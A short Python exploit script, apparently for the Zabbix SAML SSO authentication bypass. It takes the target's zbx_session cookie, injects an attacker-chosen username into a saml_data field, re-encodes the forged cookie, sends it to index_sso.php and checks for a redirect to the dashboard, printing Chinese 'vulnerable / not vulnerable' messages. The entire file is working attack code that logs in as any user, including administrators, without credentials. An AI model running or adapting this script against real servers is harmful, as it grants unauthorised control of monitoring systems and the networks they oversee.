import requests
import re
import urllib.parse
import base64
import json
import sys

def sendPayload(uri, cookie):
    url=uri+"/index_sso.php"
    headers={
                'Connection': 'close',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8',
                'Cookie': cookie
    }
    res = requests.get(url=url,headers=headers,allow_redirects=False)
    print(res.headers)
    return res

def checkResult(res):
    result="action=dashboard.view"
    if res.status_code == 302:
        if result in res.headers['Location']:
            print('存在此漏洞')
        else:
            print('不存在此漏洞')

    else:
         print('不存在此漏洞')

def exp(target, username):
    resp = requests.get(url=target, verify=False)
    cookie = resp.headers.get("Set-Cookie")

    zbx_session = re.findall(r"zbx_session=(.*?); ", cookie)

    url_decode_data = urllib.parse.unquote(zbx_session[0], encoding='utf-8')
    base64_decode_data = base64.b64decode(url_decode_data)

    decode_to_str = str(base64_decode_data, encoding='utf-8')

    to_json = json.loads(decode_to_str)

    tmp_ojb = dict(saml_data=dict(username_attribute=username), sessionid=to_json["sessionid"], sign=to_json["sign"])

    payloadJson = json.dumps(tmp_ojb)
    print("decode_payload:", payloadJson)

    payload = urllib.parse.quote(base64.b64encode(payloadJson.encode()))
    print("zbx_signed_session:", payload)
    return payload

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("argv error")
        exit(0)
    target = sys.argv[1]
    username = sys.argv[2]

    payload = exp(target, username)
    payload = "zbx_session="+payload
    res = sendPayload(target, payload)
    checkResult(res)
    
